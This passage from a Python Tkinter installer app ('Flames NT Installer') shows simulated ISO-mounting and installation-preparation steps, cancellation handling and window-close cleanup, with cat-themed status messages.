        self.status_var.set("Mounting the shiny new ISO... Almost there!")
        self.root.update_idletasks()

        if not hasattr(self, 'iso_path') or not self.iso_path.exists():
            logging.error("ISO file not found for mounting. Conversion step might have failed.")
            raise FileNotFoundError("ISO file to mount is missing. Please check conversion logs.")

        # Placeholder for Windows ISO mounting using PowerShell:
        # Mount-DiskImage -ImagePath "C:\path\to\your.iso" -PassThru | Get-Volume
        # This command returns drive letter.
        # For simplicity, we'll simulate and assign a drive letter.
        # In a real scenario, you'd parse the output of the mount command.
        
        # Example using PowerShell:
        # try:
        #     ps_command = f'Mount-DiskImage -ImagePath "{self.iso_path}" -PassThru | Get-Volume | Select-Object -ExpandProperty DriveLetter'
        #     result = subprocess.run(["powershell", "-Command", ps_command], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        #     drive_letter = result.stdout.strip()
        #     if drive_letter and len(drive_letter) == 1:
        #         self.mounted_drive = f"{drive_letter}:\\"
        #         logging.info(f"ISO successfully mounted to {self.mounted_drive}")
        #     else:
        #         raise RuntimeError(f"Failed to get drive letter after mounting. Output: {result.stdout}")
        # except subprocess.CalledProcessError as e:
        #     logging.error(f"PowerShell Mount-DiskImage failed: {e.stderr}")
        #     raise RuntimeError(f"Failed to mount ISO using PowerShell: {e.stderr}")
        # except FileNotFoundError: # PowerShell not found
        #     logging.error("PowerShell not found. Cannot mount ISO automatically.")
        #     raise RuntimeError("PowerShell is required to mount ISOs automatically on Windows.")

        time.sleep(2) # Simulate mounting
        self.mounted_drive = "Z:" # Example drive, make sure this is dynamic in real code!
        logging.info(f"ISO mounted (simulated) to drive: {self.mounted_drive}")


    def _prepare_installation(self):
        logging.info("Preparing for OS installation from mounted ISO...")
        self.status_var.set("Preparing for installation... Getting the red carpet ready!")
        self.root.update_idletasks()

        if not self.mounted_drive:
            logging.error("ISO not mounted. Cannot prepare for installation.")
            raise RuntimeError("ISO drive not available. Mount step might have failed.")
        
        # Placeholder: This step might involve copying setup files or running setup.exe from self.mounted_drive
        # e.g., subprocess.run([str(Path(self.mounted_drive) / "setup.exe"), "/auto", "upgrade", ...])
        
        time.sleep(3) # Simulate preparation
        logging.info("Preparation for installation (simulated) complete.")


    def cancel_operation(self):
        if not self.cancelled: # Prevent multiple cancel calls
            self.cancelled = True
            self.status_var.set("Cancelling... Please wait for the kitty to tidy up and say goodbye!")
            logging.info("Cancellation requested by user. Meow.")
            self.cancel_btn.config(state="disabled") # Disable cancel button once clicked
            # Note: The running thread needs to check self.cancelled periodically.

    def on_closing(self):
        """Handles window close event for graceful shutdown."""
        if messagebox.askokcancel("Quit", "Are you sure you want to close the Flames NT Installer? Kitty will miss you! üòø"):
            logging.info("Application closing sequence initiated by user.")
            self.cancelled = True # Signal any running threads to stop
            
            # Give threads a moment to acknowledge cancellation
            # This is a simple approach; more robust would use threading.Event
            time.sleep(0.5) 
            
            if hasattr(self, 'temp_dir') and self.temp_dir.exists():
                logging.info(f"Cleaning up temporary directory on exit: {self.temp_dir}")
                try:
                    shutil.rmtree(self.temp_dir, ignore_errors=True)
                except Exception as e:
                    logging.warning(f"Could not fully clean temp_dir {self.temp_dir} on exit: {e}")

            # Unmount ISO if mounted (placeholder for actual unmount logic)
            if self.mounted_drive:
                logging.info(f"Attempting to unmount ISO from {self.mounted_drive} on exit (placeholder).")
                # Add actual unmounting logic here
            
            self.root.destroy() # Close Tkinter window
            logging.info("Application closed. Bye bye! Purr! ‚ù§Ô∏è")
        else:
            logging.info("Application close cancelled by user. Kitty is happy you stayed!")


if __name__ == "__main__":
    root = tk.Tk()
    app = FlamesISOInstaller(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing) # Handle window close button
    try:
        root.mainloop()
    except KeyboardInterrupt:
        logging.info("Application interrupted by user (Ctrl+C). Cleaning up...")
        app.on_closing() # Attempt graceful cleanup
    # No 'import tkinter as tk' here, it was the SyntaxError culprit! It's at the top where it belongs!
